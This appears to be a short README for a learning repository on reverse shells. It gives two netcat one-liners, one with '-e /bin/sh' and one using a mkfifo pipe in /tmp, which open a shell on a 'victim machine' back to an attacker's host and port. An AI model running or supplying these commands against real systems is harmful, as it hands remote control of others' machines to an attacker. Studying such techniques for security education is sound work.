# Reverse_shell

Reverse shell programs on Windows and Linux for learning.

To make simple reverse shell on linux, run like this↓ on victim machine
```
nc -e /bin/sh <HOST> <PORT>
```
However, newer linux don't have -e option of ```nc``` command, so
create "backpipe" with ```mkfifo``` in ```/tmp``` instead(pretty much any account is allowed to write there.)

```
mkfifo /tmp/p; nc <HOST> <PORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
```
### Credit:
[cocomelonc](https://github.com/cocomelonc/)

Thank you for nice article!!
https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html


